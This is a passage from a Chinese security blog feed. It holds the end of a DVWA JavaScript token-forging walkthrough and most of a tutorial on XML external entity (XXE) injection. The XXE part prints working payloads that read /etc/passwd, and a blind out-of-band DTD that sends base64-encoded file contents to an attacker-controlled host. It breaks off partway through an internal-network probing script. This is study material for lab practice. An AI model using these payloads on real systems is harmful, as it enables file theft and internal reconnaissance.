document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    generate_token();</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>generate_token()</code>函数设置了一个<code>token=md5(rot13($phrase))</code></p><p>有因为<code>phrase=&#39;success&#39;</code>,所以带上这个<code>token</code>应该就对了。</p><p>因为这个函数是前台的，我们直接用<code>console</code>，修改运行一下，就能得到<code>token</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function generate_token() &#123;</span><br><span class="line">        var phrase &#x3D; &#39;success&#39;;</span><br><span class="line">        alert(md5(rot13(phrase)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/317F6r54cNS9pQx.png"></p><h2 id="Medium-13"><a href="#Medium-13" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;script src=&quot;/vulnerabilities/javascript/source/medium.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>采用引用的外部js的方式</p><p><code>setTimeout</code>是一个计时器，300毫秒就执行一次<code>do_elsesomething(&quot;XX&quot;)</code>，而<code>token</code>就在这个函数设置。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    do_elsesomething(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_elsesomething</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value + <span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="High-12"><a href="#High-12" class="headerlink" title="High"></a>High</h2><p>高级和中级类似，生成 token 的逻辑在额外的 js 文件中。和中级不同的是，这里的 JS 经过了混淆的。。。就显得很混乱。</p><p>推荐一个网站<a href="http://deobfuscatejavascript.com/#">http://deobfuscatejavascript.com/#</a></p><p>用来解js的混淆，挺好用的，或者直接看未混淆版的（<code>dvwa\vulnerabilities\javascript\source\high_unobfuscated.js</code>）</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">do_something</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = <span class="string">&quot;&quot;</span>, n = e.length - <span class="number">1</span>; n &gt;= <span class="number">0</span>; n--) t += e[n];</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_3</span>(<span class="params">t, y = <span class="string">&quot;ZZ&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(<span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value + y)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_2</span>(<span class="params">e = <span class="string">&quot;YY&quot;</span></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = sha256(e + <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">token_part_1</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&quot;token&quot;</span>).value = do_something(<span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    token_part_2(<span class="string">&quot;XX&quot;</span>)</span><br><span class="line">&#125;, <span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3);</span><br><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>这里生成 token 的步骤是：</p><p>1、执行<code>token_part_1(&quot;ABCD&quot;, 44)</code><br>2、执行<code>token_part_2(&quot;XX&quot;)</code>(原本是延迟 300ms执行的那个）<br>3、点击按钮的时候执行 <code>token_part_3</code></p><p>所以我们在输入框输入 success 后，再到控制台中输入<code>token_part_1(&quot;ABCD&quot;, 44)</code>和<code>token_part_2(&quot;XX&quot;)</code>这两个函数就可以了。</p><p>我这里没加载出js,我直接整个代码放到console执行，也是可以的，但是注意改一下执行顺序：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">token_part_1(<span class="string">&quot;ABCD&quot;</span>, <span class="number">44</span>);</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;token_part_2(<span class="string">&quot;XX&quot;</span>)&#125;,<span class="number">300</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;phrase&quot;</span>).value=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;send&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, token_part_3); </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/c4sHdulIvqW15PQ.png"></p><h2 id="Impossible-12"><a href="#Impossible-12" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level.</span><br></pre></td></tr></table></figure><p>哈哈哈哈哈哈。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://www.freebuf.com/author/lonehand">新手指南：DVWA-1.9全级别教程</a>，安全客，lonehand</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;考研大半年没碰安全方面，考完研，想重新拾起网络安全方面的知识，想起来重新复现一遍DVWA，新的一年，希望能温故知新。另一方面，新版的&lt;cod</summary>
      
    
    
    
    <category term="靶场练习" scheme="http://v0w.top/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/"/>
    
    
    <category term="RCE" scheme="http://v0w.top/tags/RCE/"/>
    
    <category term="SQL注入" scheme="http://v0w.top/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
    <category term="文件上传" scheme="http://v0w.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="文件包含" scheme="http://v0w.top/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="CSRF" scheme="http://v0w.top/tags/CSRF/"/>
    
    <category term="XSS" scheme="http://v0w.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XXE学习笔记</title>
    <link href="http://v0w.top/2019/01/20/XXE-note/"/>
    <id>http://v0w.top/2019/01/20/XXE-note/</id>
    <published>2019-01-19T16:00:00.000Z</published>
    <updated>2020-08-28T06:36:12.187Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h1><p>XXE(XML External Entity Injection) 全称为 XML 外部实体注入，这是一个注入漏洞。注入的是什么？XML外部实体。因此其利用点是 <strong>外部实体</strong> ，如果能注入 外部实体并且成功解析的话，这就会大大拓宽我们 XML 注入的攻击面。（相反，单纯的XML注入比较鸡肋。）</p><blockquote><p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。 外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。 但是，在处理外部实体时，可以针对应用程序启动许多攻击。 这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。 通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p></blockquote><h2 id="什么是-XML"><a href="#什么是-XML" class="headerlink" title="什么是 XML?"></a>什么是 XML?</h2><p>以下内容主要参考<a href="http://www.w3school.com.cn/x.asp">W3School的XML系列教程</a></p><p>要了解XXE，首先要了解XML标记语言。XML标记语言有哪些特征呢？</p><ul><li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li><li>XML 是一种<strong>标记语言</strong>，很类似 HTML</li><li>XML 的设计宗旨是<strong>传输数据</strong>，而非显示数据</li><li>XML 标签没有被预定义。您需要<strong>自行定义标签</strong>。</li><li>XML 被设计为具有<strong>自我描述性</strong>。</li></ul><p>XML 被设计为传输和存储数据，其焦点是数据的内容。HTML 被设计用来显示数据，其焦点是数据的外观。XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。XML文档用途广泛，最常见的比如订阅一个网站时的<code>rss.xml</code>等。XML本质上就是一段<strong>自我描述的数据</strong>。XML是一种树结构。语法参考链接<a href="http://www.w3school.com.cn/xml/xml_syntax.asp">http://www.w3school.com.cn/xml/xml_syntax.asp</a></p><p>重点语法规则主要有这样几点：</p><ul><li><p>所有 XML 元素都须有关闭标签</p></li><li><p>XML 标签对大小写敏感</p></li><li><p>XML 必须正确地嵌套</p></li><li><p>XML 文档必须有根元素</p></li><li><p>XML 的属性值须加引号</p></li><li><p>如果你把字符 “&lt;” 放在 XML 元素中，会发生错误，一些特殊字符需要转义。</p></li></ul><p>此外，好的XML文档不仅遵循XML的规范，还符合DTD(document type definition)规范。</p><h2 id="什么是DTD？"><a href="#什么是DTD？" class="headerlink" title="什么是DTD？"></a>什么是DTD？</h2><p>所谓的DTD，Document Type Definition，文件类型定义，用来宣告网页的文件类型。举例来说，HTML 有很多版本，如：HTML, HTML2.0, … , XHTML, XHTML5 等，利用&lt;!DOCTYPE&gt; 让浏览器能正确显示内容。</p><p>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。可一致地使用某个标准的 DTD 来交换数据。应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。还可以使用 DTD 来验证您自身的数据。</p><p>它使用一系列合法的元素来定义文档结构：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br></pre></td></tr></table></figure><p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><strong>内部的 DOCTYPE 声明</strong></p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>带有 DTD 的 XML 文档实例：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [这是DTD内部声明</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>以上 DTD 解释如下：</strong></p><ul><li><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <em>note</em> 类型的文档。</p></li><li><p><strong>!ELEMENT note</strong> (第三行)定义 <em>note</em> 元素有四个元素：”to、from、heading,、body”</p></li><li><p><strong>!ELEMENT to</strong> (第四行)定义 <em>to</em> 元素为 “#PCDATA” 类型</p><p>(之后类似)</p></li></ul><p><strong>这里有一个小重点Tips：</strong></p><ul><li>“#PCDATA” 类型为被解析的字符数据（parsed character data）。表示读文件按照XML格式进行解析</li><li>“#CDATA”类型为字符数据（character data）。表示读文件但是不用解析，直接读文件的原始内容</li></ul><p><strong>外部文档声明</strong></p><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;note.dtd&quot;</span>&gt;</span># dtd文件的绝对路径</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span> </span><br></pre></td></tr></table></figure><p>这是包含 DTD 的 “note.dtd” 文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>其他更多的可能需要读者参考这个链接进行学习<a href="http://www.w3school.com.cn/dtd/index.asp%E3%80%82">http://www.w3school.com.cn/dtd/index.asp。</a></p><p><strong>一个内部实体声明</strong></p><p>语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-string">&quot;test&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>一个外部实体声明</strong></p><p>语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">foo</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/test.dtd&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXE-的成因"><a href="#XXE-的成因" class="headerlink" title="XXE 的成因"></a>XXE 的成因</h1><p>上面介绍了这么多，大概才把XXE的基础知识介绍完，接下来，我们具体看一下这个<strong>外部实体注入漏洞</strong>的成因和攻击面。</p><p><strong>会发生XXE 主要是因为<code>parser</code> 没有禁止使用外部实体</strong>，如常见的php函数<code>simplexml_load_string()</code>会解析外部实体。我们可以自行定义一个实体名称，并在实体内容中定义要服务器做的行为，从而造成攻击，因此注入点通常是可以输入XML 的位置。</p><h1 id="XXE的攻击面"><a href="#XXE的攻击面" class="headerlink" title="XXE的攻击面"></a>XXE的攻击面</h1><p>那么，我们究竟可以利用XXE做哪些事情呢？下面介绍一下XXE的攻击面。</p><h2 id="1-有回显的任意文件读取"><a href="#1-有回显的任意文件读取" class="headerlink" title="1. 有回显的任意文件读取"></a>1. 有回显的任意文件读取</h2><p>攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们可以控制输入的XML代码造成服务器上任意文件的读取。</p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/2019-02-14_00001.png"></p><p>但是直接读文件，在遇到文件内容中含有<code>&lt;</code>,<code>&amp;</code>等未转义的字符时，解析会报错。这是由于XML的外部实体特性导致的，如以下文件：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;HTML5 rose&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/20190214210529.png"></p><p><strong>解决方案</strong></p><p>前面提到CDATA是将文件当做原始字符串而不进行解析，于是，可以通过 <code>&lt;![CDATA[</code>和 <code>]]&gt;</code>将payload包裹起来，使其不解析为XML就可以读取此类文件了。由于普通实体不能直接拼接，需要先拼接再调用，于是需要利用参数实体。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure><p><strong>evil.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/15/5c66bb86897a5.png"></p><p>于是通过<code>XXE</code>和<code>CDATA</code>就基本上实现了任意文件读取。</p><h2 id="2-无回显任意文件读取（Blind-OOB-XXE）"><a href="#2-无回显任意文件读取（Blind-OOB-XXE）" class="headerlink" title="2. 无回显任意文件读取（Blind OOB XXE）"></a>2. 无回显任意文件读取（Blind OOB XXE）</h2><p>通常情况下，xml文件是用于服务器的各项配置的，而不是直接输出的，于是我们需要寻找其他不依托服务器回显的方法来实现任意文件读取。</p><p><strong>xml.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//相比上一段代码，缺少了回显过程，只有解析过程。</span></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么，利用什么方法来进行无回显的读取呢？</p><p>通过之前的学习，我们知道参数实体是可以合并依次调用的。那么我们可以利用三个参数实体，先去访问VPS的一个<code>evil.dtd</code>，调用<code>evil.dtd</code>的参数去读取服务器的敏感文件，放到一个参数中，再利用最后一个参数实体将文件内容发到VPS的一个端口。</p><p>利用这个思路，我们可以构造这样的payload：</p><p><strong>test.dtd</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;e:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;ip:2333?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><strong>payload：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/02/15/5c66cf1bf405b.png"></p><p><img src="https://i.loli.net/2019/02/15/5c66cefa5b4a8.png"></p><p><strong>需要注意的是</strong>dtd文件中作为内容的一段实体数据需要转义<code>&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://ip:2333?p=%file;&#39;&gt;&quot;</code></p><p>发现虽然无回显，但是依然可以通过这样的方法读取数据。</p><p>笔者通过一个图来理解整个调用过程：</p><p><img src="https://i.loli.net/2019/02/17/5c695e47dc191.png"></p><p>上面说了XXE读文件的两种操作，主要适合利用<code>file</code>协议，攻击方式上有点类似SSRF，通过伪造xml外部实体或者dtd文件来执行，读取服务器上的敏感文件。事实上，我们还可以通过XXE打开内网渗透的大门，下面来学习一下通过XXE进行内网的探测。</p><h2 id="3-http内网探测"><a href="#3-http内网探测" class="headerlink" title="3. http内网探测"></a>3. http内网探测</h2><p>类似的，我们通过读文件的方式判断是否存在内网主机，筛选出内网主机IP。如果能从中读取到内容，那么可以判断这个IP的内网主机是存在的。</p><p>在此之前，还有一个步骤需要完成，即确定内网的网段，时间宝贵，我们应该优先确定内网网段，再查找内网主机IP，所以需要利用XXE读取一些文件如<code>/proc/net/arp</code>，<code>/etc/host</code>等。</p><p>还是利用上面有回显<code>xml.php</code>为例子：</p><p><img src="https://i.loli.net/2019/02/17/5c691efa362df.png"></p><p>读取文件后，基本确定内网网段在<code>192.168.118.0</code></p><p>构建脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># referer: https://xz.aliyun.com/t/3357#toc-11</span></span><br><span class="line">ip_arr=[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_xml</span>(<span class="params">string</span>):</span></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span class="string">&quot;\r\n&quot;</span> + <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE creds [&quot;&quot;&quot;</span></span><br><span class="line">    xml = xml + <span 